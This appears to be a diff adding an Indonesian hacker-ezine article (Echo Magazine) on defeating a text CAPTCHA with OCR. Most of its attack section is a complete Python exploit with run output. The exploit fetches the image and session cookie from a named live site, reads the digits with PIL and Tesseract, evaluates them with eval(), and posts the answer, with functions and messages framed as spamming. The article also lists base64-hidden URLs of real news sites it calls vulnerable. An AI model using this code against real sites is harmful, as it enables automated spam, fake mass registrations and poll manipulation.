@@ -1,0 +1,515 @@
+                     _|                            _|                      
+   _|_|      _|_|_|  _|_|_|      _|_|    _|_|_|_|      _|_|_|      _|_|    
+ _|_|_|_|  _|        _|    _|  _|    _|      _|    _|  _|    _|  _|_|_|_|  
+ _|        _|        _|    _|  _|    _|    _|      _|  _|    _|  _|        
+   _|_|_|    _|_|_|  _|    _|    _|_|    _|_|_|_|  _|  _|    _|    _|_|_|  
+
+ECHO MAGAZINE VOLUME VIII, ISSUE XXII, PHILE 0x009.TXT
+
+Exploitasi Captcha: Kebangkitan Sang Robot - y3dips
+y3dips/at/echo/dot/or/dot/id
+
+
+---[ Pendahuluan
+
+Artikel ini dibuat bukan untuk memberi permen kepada Robot/Spammer/Kiddo
+atau siapapun yang memiliki kepentingan dengan "breaking the Captcha",
+tetapi sebagaimana artikel security umumnya yang mengajak para penikmatnya
+untuk memahami 2 sisi yang dapat di peroleh dari suatu pembahasan, begitu
+pula diharapkan dalam mensikapi artikel ini :).
+
+Captcha sendiri sudah sangat teramat sering di bobol, baik itu adalah
+Captcha yang dimiliki dan di kembangkan oleh perusahaan-perusahaan besar
+seperti Google, Yahoo, Hotmail [1] dsb, atau hanya Captcha pada sebuah 
+forum diskusi dari suatu komunitas.
+
+Pemanfaatan Captcha menunjukkan perkembangan yang cukup pesat, baik itu
+untuk situs pribadi, organisasi, entertaintment, sampai
+perusahaan-perusahaan besar "terlihat aware" terhadap pentingnya Captcha
+itu sendiri, tetapi apakah benar?. 
+
+Penggunakan Captcha tidak berarti membuat situs anda aman dari SPAMBOT,
+worm, DDOSer. Dan hasil keliling sebentar di berbagai situs news baik dalam
+dan luar negeri cukup mencengangkan, karena rata-rata sudah memanfaatkan
+Captcha untuk halaman komentar dan registrasi, tetapi lebih rata lagi
+adalah hampir sebagian besar Captcha yang di gunakan "vulnerable" terhadap
+eksploitasi yang akan di jabarkan pada artikel ini.
+
+Efek dari eksploitasi Captcha sendiri tidak akan berakibat langsung
+terhadap penguasaan/pengambil alihan suatu system, Efek yang paling mungkin
+timbul adalah efek sampingnya, sebagai contoh halaman profil Calon Presiden
+yang selanjutnya di penuhi dengan komentar obat pria, atau mungkin yang
+lebih buruk lagi :), polling Online yang seharusnya netral saat memilih
+"Raja Alay Sedunia" harus terganggu karena salah satu kandidat membayar
+orang untuk meng"hack" captcha yang digunakan dan meregister kemudian
+mem-vote untuk dirinya :) 
+
+Lebih jauh lagi adalah pembuatan akun google/yahoo/msn secara massal yang
+kemudian di perdagangkan lagi dikalangan para spammer; atau bagi anda yang
+memiliki quota hosting 10GB yang dalam waktu cepat telah terisi dengan
+"Sampah", sehingga dalam waktu tidak cukup lama anda akan menerima email
+dari penyelenggara hosting anda bahwa Quota Anda telah habis :)
+
+Tetapi sesungguhnya tujuan dari penulisan artikel ini adalah (tetap) ingin
+menunjukkan keindahan dalam mengeksploitasi sesuatu, Captcha yang
+seharusnya (sesuai definisi) tidak boleh/bisa di pecahkan oleh Aplikasi
+(Mesin) telah gagal dan akan semakin gagal apabila tidak berkembang, tetapi
+Teknologi Captcha ini masih terus akan berkembang, begitu pula teknologi
+untuk mem-"break/crack/exploitasi"-nya. Artikel kali ini hanyalah
+menjabarkan secara langsung (disertai POC) terhadap salah satu jenis
+Captcha yang pernah ada dan bahkan masih digunakan saat ini.
+
+
+---[ Background
+
+Captcha yang pada awalnya di ambil dari kata "Capture" dan selanjutnya
+memiliki kepanjangan "Completely Automated Public Turing test to tell
+Computers and Humans Apart" ini memang di ciptakan untuk membedakan Manusia dan
+mesin. Teknologi ini diharapkan dapat mengcounter-attack atau setidaknya
+bertahan terhadap "invasi" para spammer/botter/juraganbotnet yang terkenal
+sangat gencar dalam melakukan "pekerjaannya".
+
+Pada awalnya Captcha  di kembangkan oleh Altavista pada tahun 1997
+bertujuan untuk memblok search otomatis terhadap URL search-engine
+miliknya, setelah salah satu usernya melakukan submit otomatis sejumlah URL
+untuk meningkatkan rangkingnya.  Andrei Broder yang merupakan kepala
+peneliti di Altavista dan rekannya berhasil menciptakan filter, yang
+metodenya adalah menciptakan teks-teks yang tercetak diatas gambar2
+sehingga tidak bisa dibaca mesin, tetapi dapat di baca manusia. Dan filter
+yang selanjutnya di kenal Captcha ini dianggap berhasil mengurangi jumlah
+spam ke Altavista sampai 95% sampai tahun 2002. [2]
+
+Kemudian Captcha terus berkembang sampai saat ini. 
+
+Adapun beberapa kegunaan dari Captcha adalah: [3]
+
+  1. Melindungi Komentar Web/Blog dari Spam 
+  2. Melindungi Halaman Registrasi
+  3. Melindungi Email Address
+  4. Melindungi Polling Online
+  5. Melindungi dari BruteForce/Dictionary Attack
+  6. Melindungi dari Bot milik Search Engine
+  7. Melindungi dari Serangan Worms, DOS
+
+Sedangkan Karakteristiknya menurut Wikipedia[4] adalah:
+
+  1. Tidak bisa dipecahkan secara akurat oleh aplikasi yang ada saat ini
+  2. Dapat di mengerti oleh sebagian besar manusia
+  3. Tidak Bergantung kepada Jenis Captcha yang baru, tetapi terus berkembang
+
+Beberapa Tipe Captcha yang umum kita temui:
+
+1. Hard Recognized text
+
+Captcha jenis inilah yang sangat banyak beredar, dimana Captcha tersebut
+berupa teks yang sulit untuk di kenali, di acak bentuknya, dengan warna
+yang beragam dan berbagai teknik untuk mempersulit aplikasi/mesin
+mengenalinya. Captcha jenis inilah yang akan menjadi target Artikel ini
+nantinya.  
+
+2. Pattern Matching
+
+Captcha jenis ini meminta user untuk memilih gambar yang sesuai dengang
+kata yang diharapkan, atau juga mencocokkan gambar yang sejenis atau
+mendekati (misal jenis mobil) dan  dibuat dengan Flash 
+
+3. Sound Recognition
+
+Captcha jenis ini sebenarnya pada awalnya merupakan versi Captcha untuk
+mereka yang memiliki kelemahan dalam hal penglihatan, tetapi pada akhirnya
+dikembangkan tersendiri, misal dengan penggunaan  teknik "scramble voice" 
+
+---[ Ekploitasi Hard Recognized Text Captcha
+
+Berikut adalah beberapa teknik eksploitasi yang umumnya digunakan pada
+Captcha jenis "Hard Recognized Text" dan bahasan kita selanjutnya hanyalah
+terfokus untuk Captcha Tipe/Jenis ini.
+
+1. Eksploitasi Aplikasi 
+
+Cara yang digunakan adalah dengan mengeksploitasi/mencari celah pada
+aplikasi, untuk mem"bypass" mekanisme Captcha itu sendiri, misal dengan
+memanfaatkan penggunaan Session secara berulang (attacker hanya perlu 1
+kali menginput Captcha dan kemudian menggunakan session tersebut
+berkali-kali), atau attacker secara langsung menuju halaman untuk "submit"
+form, tanpa harus melalui mekanisme Captcha.[5]
+
+2. Pemanfaatan Sumber Daya Manusia (relay attack)
+
+Umumnya pihak yang berkepentingan  akan secara langsung memperkerjakan
+manusia untuk memasukkan kode Captcha dari suatu situs, baik
+resmi(berbayar/pekerjaan) atau dengan cara menipu user untuk memasukkan
+Captcha Challenge padahal Captcha Challenge tersebut adalah milik situs
+yang ingin di break Captcha-nya.
+ 
+3. Script and Recognition Kits
+
+Teknik ketiga inilah yang akan dibahas di artikel ini, teknik ekploitasi
+ini juga memiliki beberapa fase dan tingkat kesulitan yang sesuai dengan
+jenis  Captcha yang akan di "break"/eksploitasi.
+
+Adapun tahapan-tahapannya secara umum adalah sbb: 
+
+	- Pre-Recognition (ambil image, ambil cookies, dsb)
+	- Processing (Image Processing, Segmentation, Pattern Matching, etc)
+	- Recognition/OCR
+
+Untuk jenis ini, berikut adalah kriteria Captcha yang relatif dengan mudah
+dapat di "break":
+
+  1. Warna Backgorund dan String Captcha berbeda.
+  2. Warna Teks seragam
+  3. Font yang di gunakan adalah font standar
+  4. Posisi teks (String) tidak beragam (tidak ada rotasi)
+
+Satu hal yang menarik dalam mengeksploitasi Captcha Jenis ini adalah
+kemampuan kita dalam hal memproses gambar, untuk mendapatkan Strings dari
+Captcha itu sendiri, tidak ada general Eksploits untuk Eksploitasi Captcha
+dikarenakan keragaman Captcha itu sendiri :), tetapi Logika untuk atau
+teknik untuk membreak-nya adalah tetap akan sama, bagaimana mendapatkan
+Variabel (strings) yang harus di submit.
+
+---[ Proof Of Concept
+
+POC[1] akan mengujicoba contoh Captcha yang disediakan secara gratis oleh
+RumahWeb, Oleh karena itu patut saya ucapkan terima kasih sebesar-besarnya
+untuk rumahweb atas Captcha Online-nya yang saya rasa sesuai dengan
+judulnya "Simple Captcha", sehingga dapat memberikan pelajaran buat kita
+baik dalam hal membuat Captcha dan meng-eksploitasinya :)
+
+Untuk POC[n] Merupakan beberapa situs berita yang memiliki celah Captcha
+dan telah di uji berhasil untuk di "break", tidak ada script yang akan di
+tampilkan, serta tidak ada penjelasan lebih lanjut melainkan hanya URL yang
+bisa anda ujicobakan :) 
+
+-----[ POC[1] http://rumahweb.com/imgjournal/captcha/form.php 
+
+Sebelum melakukan eksploitasi, sebaiknya kite mempelajari dulu
+karakteristikd ari suatu Captcha,  karena seperti yang saya nyatakan di
+atas, bahwa setiap Captcha itu unik, untuk itu mari kita analisa captcha
+yang di gunakan pada Contoh yang diberikan oleh RumahWeb.
+
+Tampilan Captcha (lol. hard to create in ASCII mode, but its fun :P)
+
+	+-----------------+
+        |*>**>**>**>**>**>|
+        |*>**>10*+*7*>**>*|
+        |*>**>**>**>**>**>|
+        +-----------------+
+
+*Disarankan untuk melihat image Aslinya di URL yang dimaksud bagi anda yang
+masih kesulitan berimajinasi :lol:
+
+[Titik lemah dari Captcha milik Rumahweb]
+  1. Kode Captcha Tersedia
+  2. Background Captcha Merupakan Gambar yang Tetap 
+  3. Merupakan Angka dengan format dan ukuran normal
+  4. Warna String (angka) Captcha satu warna (dalam hal ini Putih)
+  5. Warna String (angka) sangat berbeda dengan warna Background
+  6. Tidak ada Rotasi, perbedaan Vertikal/Horizontal pada tiap Karakter 
+
+[Titik kuat dari Captcha milik Rumahweb]
+  1. Terdapat Metode Penjumlahan
+  2. Menggunakan Session berbeda pada tiap2 Captcha Image
+  3. Session merupakan hasil Penjumlahan
+  4. Session berbeda yang di gunakan pada Captcha dan Halaman Submit
+
+Selanjutnya adalah membuatkan eksploitnya :)
+
+-------[ Exploit Diagram
+
+Untuk Memudahkan dalam menjabarkan eksploit, maka berikut adalah diagram
+yang merepresentasikan Module yang saya gunakan: 
+
+        +------------+
+     +--| Grab Image |
+     |  +------------+
+     |        | +----------------+ +---------------+
+     |        |_| Process Image  |_| Process Image |
+     |          | to get cookies | | to get Strings|
+     |          +----------------+ +---------------+
+     |                  |                  |
+     |                  |          +---------------+ 
+  +-----------+         |          | Sum the       |
+  | Repeat  & |         |          |   Strings     | 
+  | Threading |         |          +---------------+
+  +-----------+         |__________________|
+     |                  |    
+     |            +--------------+  
+     |            |   Post       |   
+     |            | the Result   |
+     |            | get response |
+     |            +--------------+
+     |_ ________________|
+                       
+
+Baiklah,saya tidak akan secara detail membahas programnya, karena pastinya
+akanlah sangat membosankan bagi anda. Tetapi saya akan membahas beberapa
+trik yang mungkin berguna bagi anda yang ingin mencoba mengeksplotasi
+Captcha.
+
+Dari Diagram Diatas, bagian yang cukup menarik tentunya bagian untuk
+mendapatkan "Captcha String", tetapi sebelum itu bagian untuk mengambil
+cookies juga sangat tricky, Untuk Captcha ini pastikan bahwa anda
+mengambil Cookies dari halaman Image (captcha.php) (untuk lebih detil bisa
+melihat pada baris 20-30 pada module sedot_cookies_gambar pada eksploit)
+karena Session di generate dari hasil penjumlahan Angka pada Captcha.[6]
+
+----------------] captcha.php [---=
+
+   $hasil = $acak1 + $acak2;
+   ----- truncate-------
+   $_SESSION['capcay'] = $hasil;
+
+----------------] captcha.php [---=
+
+Dan pastikan untuk diambil dalam 1 kali request dengan saat mengambil image
+(saya kira anda semua sudah paham :)). Berikut adalah Diagram saat proses
+pengolahan Image menjadi Strings berlangsung. Yang secara detil dapat
+dilihat pada module proses di baris ke 50-71 dari eksploit dibawah.
+
+                      +------------------+
+                      |  Captcha Image   |
+                      |  Processing      |
+                      +------------------+
+                               |
+                      +------------------+
+                      | GrayScales It    |
+                      +------------------+
+                               |
+                      +--------------------+
+                      | convert RGBA modes |
+                      | to get pallete     |
+                      +--------------------+
+                               | <----------------- use .getcolors()
+                      +--------------------+
+                      | Background pallete |
+                      | change to Black    |
+                      +--------------------+
+                               |
+                      +-------------------+
+                      |  Resize image     |
+                      +-------------------+
+                               |
+                      +-------------------+
+                      |   Virtual OCR     |
+                      +-------------------+
+
+Kemudian saat akan memisahkan Background dengan Angka, untuk membersihkan
+background maka ada baiknya menggunakan fungsi "getcolors()" dari Module
+PIL untuk mendapatkan "exact" pallete yang akan kita pilah2, dalam hal ini
+saya menjadikan selain warna Putih yang merupakan warna dasar Angka dari
+Captcha akan di ubah ke Hitam, sehingga mempermudah proses Scanning
+(image_to_strings)).Salah satu cara untuk mempermudah "troubleshoot" adalah
+dengan menyimpan setiap Image sehabis memproses sesuatu (img.save).
+
+Untuk penjumlahan (padahal Strings) saya menggunakan join (baris ke 74 dari
+module proses dari eksploit), sedangkan untuk Image Processing memanfaatkan
+module PIL (Python Imagnge Library)[7].
+
+-------[ Exploit Code
+
+Berikut adalah eksploit lengkapnya.
+
+----------------] capcah_exp.py [---=
+
+  1 #!/usr/bin/env python
+  2 # echozine issue 22, Exploiting Captcha: Return of the R0b0t
+  3 # Id: capcah_exp.py 2010/13/05 11:11:11 y3dips Exp $
+  4 
+  5 import urllib, urllib2, sys, httplib, re
+  6 from PIL import Image
+  7 from tesseract import *
+  8 
+  9 kepala = {
+ 10            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
+ 11            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+ 12            "Accept-Language": "en-us,en;q=0.5",
+ 13            "Accept-Encoding": "gzip,deflate",
+ 14            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+ 15            "Keep-Alive": "600",
+ 16            "Proxy-Connection": "keep-alive",
+ 17            "Content-Type": "application/x-www-form-urlencoded"
+ 18 }
+ 19 
+ 20 def sedot_cookie_gambar(c_url):
+ 21     req = urllib2.Request(c_url)
+ 22     rop = urllib2.urlopen(req)
+ 23     if rop.headers.has_key("Set-Cookie"):
+ 24         cookie = rop.headers.getheader("Set-Cookie")
+ 25         img = rop.read()
+ 26         f= open('gambar.png', 'wb')
+ 27         f.write(img)
+ 28         f.close()
+ 29         imf='gambar.png'
+ 30     return cookie, imf
+ 31 
+ 32 def sepam_on(proxy, pport, s_url, p_url, kepala, c_str):
+ 33     data = urllib.urlencode(c_str)
+ 34     print "Spamming On d'Way.."
+ 35     #set Proxy doeloe!
+ 36     conn=httplib.HTTPConnection(proxy, pport)
+ 37     conn.request("POST", s_url+p_url, data, kepala)
+ 38     res = conn.getresponse()
+ 39     code = res.status
+ 40     if(code==200):
+ 41         data = res.read()
+ 42         if re.match("Lolos Validasi",data):
+ 43             print "Successfully Spamming"
+ 44         else:
+ 45             print "Failed, Cry out loud baby :p"
+ 46     else:
+ 47         print "Got response: ", code
+ 48 
+ 49 
+ 50 def proses(imf):
+ 51     image = Image.open(imf)
+ 52     im = image.convert('L')
+ 53 
+ 54     img = im.convert("RGBA")
+ 55     img.save('gbr.png')
+ 56 
+ 57     pixdata = img.load()
+ 58     for y in xrange(img.size[1]):
+ 59         for x in xrange(img.size[0]):
+ 60             if pixdata[x, y] <= (200, 200, 200, 255):
+ 61                 pixdata[x, y] = (0, 0, 0, 0)
+ 62 
+ 63     img.save("gbr1.gif", "GIF")
+ 64 
+ 65     im = Image.open('gbr1.gif')
+ 66     im = im.resize((200, 86), 2)
+ 67 
+ 68     im.save("gbr2" + ".tif")
+ 69 
+ 70     img = Image.open('gbr2.tif')
+ 71     cptch= image_to_string(img)
+ 72     print "Captcha Strings =" ,cptch
+ 73 
+ 74     result = eval(''.join([str(x) for x in cptch]))
+ 75     print "Ready Submit Captcha Strings =" ,result
+ 76     return result
+ 77 
+ 78 def _kirim():
+ 79     global kepala
+ 80 
+ 81     proxy = '127.0.0.1'
+ 82     pport = '8080'
+ 83     s_url = 'http://rumahweb.com'
+ 84     p_url = '/imgjournal/captcha/form.php'
+ 85     c_url = 'http://rumahweb.com/imgjournal/captcha/captcha.php'
+ 87     cookie,imf = sedot_cookie_gambar(c_url)
+ 88     kepala['Cookie'] = cookie
+ 89     result= proses(imf)
+ 90 
+ 91     c_str = {'ccek':result,'cek':'Cek'}
+ 92     sepam_on(proxy, pport, s_url, p_url, kepala, c_str)
+ 93 
+ 94 def fvck_alay():
+ 95     print "|=== Captcha Exploitation Code. Coepoe code detected (lol) ===|"
+ 96     print " \================ The Rise Of the r0b0t: y3dips ============/"
+ 97 
+ 98 def main():
+ 99     fvck_alay()
+100     _kirim()
+101 
+102 main()
+
+----------------] capcah_exp.py [---=
++----
+| DareDevil:src y3dips$ ./capcah_exp.py 
+| |=== Captcha Exploitation Code. Coepoe code detected (lol) ===|
+|  \================ The Rise Of the r0b0t: y3dips ============/
+|
+| Tesseract Open Source OCR Engine
+| Captcha Strings = 7+20
+|
+|
+| Ready Submit Captcha Strings = 27
+| Spamming On d'Way..
+| Successfully Spamming
+| DareDevil:src y3dips$
++----
+
+Seperti yang anda lihat, Eksploit ini minus module Repeatition&Threading,
+sehingga hanya cukup bermanfaat untuk memberikan POC sahaja :), meskipun
+begitu, tidak sulit untuk anda berkreasi dengannya, dan saya hanya bisa
+menginggatkan bahwa semua berpulang kepada pribadi dan kemampuan anda
+masing2 :)
+
+
+-----[ POC[2] Beragam situs dengan Captcha yang Vulnerable:
+
+ 1. aHR0cDovL3d3dy50ZW1wb2ludGVyYWt0aWYuY29tL3NoYXJlL3BocF9jYXB0Y2hhLnBocA==
+ 2. aHR0cDovL2lmYWNlLm9rZXpvbmUuY29tL2tva28vY2FwdGNoYW1pbmkv 
+ 3. aHR0cDovL2JvbGEubGlwdXRhbjYuY29tL2xpYnMvdkltYWdlL2ltZy5waHA=
+ 4. ... dan banyak lagi :P
+
+
+---[ Kesimpulan
+
+Bagi saya pribadi, hasil eksploitasi Captcha tidaklah semenarik proses
+serta eksploitasinya itu sendiri, karena tidak ada kepentingan yang berarti
+untuk saya :), serta lebih merupakan suatu pembuktian lain bahwa ada
+kompetisi berarti disini, dan produk Captcha ini sendiri sangatlah jauh
+dari yang di harapkan, terbukti dengan sedikit barisan kode serta mesin
+yang tidak terlalu canggih pun dapat mengalahkan teknologi yang seharusnya
+dapat melindungi dari "otomatisasi" ala robot/mesin.
+
+Captcha sendiri sudah mengalahkan egonya dan akhirnya mengangkat dan
+menggunakan Re-Captcha [8], yang bahkan di 2007 telah saya buatkan patch
+untuk PHP-Fusion CMS dan digunakan untuk situs e-rdc.org [9].
+
+Meskipun hanya salah satu jenis Captcha dan juga merupakan versi yang
+relatif lama telah kita eksploitasi, tetapi tidak menutup kemungkinan
+versi-versi lain atau lebih baru dari Captcha itu sendiri bisa di
+eksploitasi[10].
+
+Fitur tambahan seperti registrasi/user terdaftar untuk melakukan komentar,
+tetap dilakukannya moderasi baik manual, regex atau sistem blacklist akan
+dapat memperkuat dan melindungi halaman web kesayangan anda :), atau anda
+dapat mulai beralih ke bentuk baru dari Captcha [11]. Tetapi 1 hal yang
+perlu diingat, "jangan biarkan diri anda tetap diam di tempat" :).
+
+---[ Referensi
+
+[1] "Gmail, Yahoo and Hotmail's CAPTCHA broken by spammers".Dancho Danchev.2008
+    http://www.zdnet.com/blog/security/gmail-yahoo-and-hotmails-captcha-broken-by-spammers/1418
+
+[2] "History of Captcha"
+    http://www2.parc.com/istl/projects/captcha/history.htm
+
+[3] "The Official CAPTCHA Site"
+    http://www.captcha.net
+
+[4] "CAPTCHA - Wikipedia, the free encyclopedia"
+    http://en.wikipedia.org/wiki/CAPTCHA
+
+[5] "Breaking CAPTCHAs Without Using OCR". Howard Yeend. 2005
+    http://www.puremango.co.uk/2005/11/breaking_captcha_115/
+
+[6] "Simple Captcha". 2007 
+    http://www.rumahweb.com/journal/simple-captcha.htm 
+
+[7] "Python Imaging Library (PIL)"
+    http://www.pythonware.com/products/pil/
+
+[8] "reCAPTCHA: Stop Spam, Read Books"
+    http://www.recaptcha.net
+
+[9] "Re-captcha Patch for PHP Fusion" . y3dips. 2007.
+    http://code.google.com/p/recaptcha-php-fusion/
+
+[10] "Around the Captcha". 2008
+    http://network-security-research.blogspot.com/2008/08/around-captcha.html
+	
+[11] http://server251.theory.cs.cmu.edu/cgi-bin/sq-pix
+
+[xx] "Breaking a Simple CAPTCHA". ryan. 2007.
+    http://www.thatsquality.com/articles/breaking-a-simple-captcha
+
+[xx] "Breaking a Visual CAPTCHA". 2002
+    http://www.cs.sfu.ca/~mori/research/gimpy/
+
+[xx] "Using PIL to make all white pixels transparent?".2009
+    http://stackoverflow.com/questions/765736/using-pil-to-make-all-white-pixels-transparent/
